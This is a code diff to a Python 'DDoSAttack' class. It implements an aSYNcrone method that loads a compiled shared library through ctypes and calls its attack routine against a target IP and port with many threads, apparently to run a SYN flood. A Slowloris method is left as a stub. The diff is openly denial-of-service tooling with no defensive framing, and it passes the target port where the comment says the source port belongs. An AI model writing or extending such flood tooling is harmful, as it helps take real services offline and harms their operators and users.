@@ -35,8 +35,28 @@ class DDoSAttack:
             logging.error(f"Unknown attack type: {self.attack_type}")
 
     def aSYNcrone_attack(self):
-        # TODO: Implement the aSYNcrone attack here
-        raise NotImplementedError
+        import ctypes
+
+        # Load the shared library
+        aSYNcrone = ctypes.CDLL("./src/aSYNcrone.so")
+
+        # Assuming the attack function takes four arguments (source port, target IP, target port, threads number)
+        aSYNcrone.attack.argtypes = [
+            ctypes.c_int,
+            ctypes.c_char_p,
+            ctypes.c_int,
+            ctypes.c_int,
+        ]
+        aSYNcrone.attack.restype = ctypes.c_int
+
+        # Run the attack
+        logging.info(f"Running aSYNcrone attack with {self.num_connections} threads")
+        aSYNcrone.attack(
+            self.target_port,
+            self.target_ip.encode(),
+            self.target_port,
+            self.num_connections,
+        )
 
     def slowloris_attack(self):
         # TODO: Implement the Slowloris attack here
